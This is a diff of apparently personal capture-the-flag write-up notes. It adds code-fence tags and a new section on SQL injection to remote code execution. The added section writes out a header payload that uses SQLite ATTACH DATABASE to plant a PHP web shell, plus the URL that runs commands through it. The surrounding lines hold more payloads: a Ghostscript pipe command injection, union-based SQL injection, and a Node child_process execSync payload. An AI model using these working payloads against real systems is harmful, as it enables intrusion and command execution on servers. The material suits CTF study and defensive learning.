@@ -12,7 +12,7 @@ Bypass login using *:* credentials.
 
 Get reese's password -> flag:
 Python script: 
-```
+```python3
 import requests, string
 alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
 
@@ -85,7 +85,7 @@ mark /OutputFile (%pipe%cat flag >> /app/application/static/petpets/flag.txt) cu
 JWT Algorithm Confusion -> https://portswigger.net/web-security/jwt/algorithm-confusion
 
 Next SQL Injection (SQLite3)
-```
+```sql
 # Get Tables
 user_in_database' union select name,NULL from sqlite_master where type='table' and name not like 'sqlite_%';-- 
 
@@ -113,4 +113,18 @@ Payload for this challenge:
   ((require(\"child_process\")).execSync(\"cd .. && cat flag.txt > /app/static/instances/RCE.txt\"))
 ---RCE;
 
+```
+
+## Intergalactic POST `SQL Injection with RCE [SQLite3]`
+If given arguments arent't properly validated:
+```php
+$this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
+```
+We can add `X-Forwarded-For` header and it's value will be passed to `$ip_address`
+```sql
+X-Forwarded-For: a','a');ATTACH DATABASE '/www/lol.php' AS lol;CREATE TABLE lol.pwn (dataz text);INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
+```
+Next arguments can be given through URL:
+```url
+http://104.248.173.13:32130/lol10.php?cmd=cat%20../flag_d055c3346bc2c02.txt
 ```
